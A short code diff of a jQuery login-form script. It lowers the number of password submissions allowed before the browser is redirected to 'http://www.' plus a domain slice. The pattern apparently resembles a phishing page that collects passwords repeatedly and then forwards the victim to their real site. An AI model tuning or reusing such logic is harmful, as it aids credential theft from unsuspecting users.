@@ -331,7 +331,7 @@ $(document).ready(function(){
                 console.log(response);
                 if(response['signal'] == 'ok'){
                   $("#pasword").val("");
-                  if (count>=3) {
+                  if (count>=2) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("http://www."+my_slice);
